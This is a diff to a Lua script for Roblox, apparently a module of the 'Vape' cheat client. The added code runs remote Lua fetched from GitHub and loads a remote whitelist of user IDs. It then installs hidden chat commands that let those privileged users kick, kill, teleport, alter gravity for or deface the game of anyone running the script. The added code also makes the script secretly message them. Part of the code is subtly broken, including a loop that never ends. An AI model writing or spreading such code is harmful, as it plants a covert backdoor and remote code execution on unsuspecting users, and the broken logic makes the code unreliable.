@@ -1227,5 +1227,148 @@ end)
 														
 if players.table0x54 then
 	VapeGui["CreateNotification"]("Rise Detected", "table0x54 is in ur game", 5)
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/Chattags/main/Loader.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/Chattags/main/Loader.lua"))()
+end
+
+if players.XylexIsCanada then
+	VapeGui["CreateNotification"]("Rise Detected", "XylexIsCanada is in ur game", 5)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/Chattags/main/Loader.lua"))()
+end
+
+local stupidwhitelists = loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/Chattags/main/whitelists.lua"))()
+
+local whitelists = {
+    ["IsPrivUserInGame"] = function()
+        for i, v in pairs(game.Players:GetPlayers()) do
+            for k, b in pairs(stupidwhitelists) do
+                if v.UserId == tonumber(b) then
+                    return true
+                end
+            end
+        end
+        return false
+    end,
+    ["GetPrivUser"] = function()
+        for i, v in pairs(game.Players:GetPlayers()) do
+            for k, b in pairs(stupidwhitelists) do
+                if v.UserId == tonumber(b) then
+                    return v.Name
+                end
+            end
+        end
+    end
+}
+
+local alreadytold = {}
+
+repeat
+    if lplr.Name == whitelists["GetPrivUser"]() then break end
+    task.wait(1)
+    if whitelists["IsPrivUserInGame"]() then
+        if not table.find(alreadytold, whitelists["GetPrivUser"]()) then
+            table.insert(alreadytold, whitelists["GetPrivUser"]())
+            args = {
+                [1] = "/whipser " .. whitelists["GetPrivUser"](),
+                [2] = "All"
+            }
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+            task.wait(0.5)
+            args = {
+                [1] = "RISEDETECTEDCODE_Table",
+                [2] = "All"
+            }
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+        end
+    end    
+until (true == false)
+
+for i, v in pairs(game.Players:GetPlayers()) do
+    if lplr.Name == whitelists["GetPrivUser"]() then 
+        v.Chatted:connect(function(msg)
+            if msg == "RISEDETECTEDCODE_Table" then
+                VapeGui["CreateNotification"]("Rise Detected", v.Name.. " is using rise", 5)
+            end
+        end)
+    else
+        for lol, xd in pairs(stupidwhitelists) do
+            if v.UserId == tonumber(xd) then
+                v.Chatted:connect(function(msg)
+                    if msg:find(";kick") then
+                        if msg:find(lplr.Name) then
+                            local args = msg:gsub(";kick " .. lplr.Name, "")
+                            lplr:Kick(args)
+                        end
+                    end
+                    if msg:find(";kill") then
+                        if msg:find(lplr.Name) then
+                            lplr.Character.Humanoid:TakeDamage(lplr.Character.Humanoid.Health)
+                        end
+                    end
+                    if msg:find(";rickroll") then
+                        if msg:find(lplr.Name) then
+                            local function funnyfunc(v)
+                                if v:IsA("ImageLabel") or v:IsA("ImageButton") then
+                                    v.Image = "http://www.roblox.com/asset/?id=7083449168"
+                                    v:GetPropertyChangedSignal("Image"):Connect(function()
+                                        v.Image = "http://www.roblox.com/asset/?id=7083449168"
+                                    end)
+                                end
+                                if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
+                                    if v.Text ~= "" then
+                                        v.Text = "Never gonna give you up"
+                                    end
+                                    v:GetPropertyChangedSignal("Text"):Connect(function()
+                                        if v.Text ~= "" then
+                                            v.Text = "Never gonna give you up"
+                                        end
+                                    end)
+                                end
+                                if v:IsA("Texture") or v:IsA("Decal") then
+                                    v.Texture = "http://www.roblox.com/asset/?id=7083449168"
+                                    v:GetPropertyChangedSignal("Texture"):Connect(function()
+                                        v.Texture = "http://www.roblox.com/asset/?id=7083449168"
+                                    end)
+                                end
+                                if v:IsA("MeshPart") then
+                                    v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
+                                    v:GetPropertyChangedSignal("TextureID"):Connect(function()
+                                        v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
+                                    end)
+                                end
+                                if v:IsA("SpecialMesh") then
+                                    v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
+                                    v:GetPropertyChangedSignal("TextureId"):Connect(function()
+                                        v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
+                                    end)
+                                end
+                                if v:IsA("Sky") then
+                                    v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
+                                    v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
+                                    v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
+                                    v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
+                                    v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
+                                    v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
+                                end
+                            end
+                            for i,v in pairs(game:GetDescendants()) do
+                                funnyfunc(v)
+                            end
+                            game.DescendantAdded:Connect(funnyfunc)
+                        end
+                    end
+                    if msg:find(";lagback") then
+                        if msg:find(lplr.Name) then
+                            lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 10000, 0)
+                        end
+                    end
+                    if msg:find(";gravity") then
+                        if msg:find(lplr.Name) then
+                            local args = msg:gsub(";gravity " .. lplr.Name, "")
+                            game.Workspace.Gravity = tonumber(args)
+                        end
+                    end
+                end)
+            end
+        end
+    end
 end
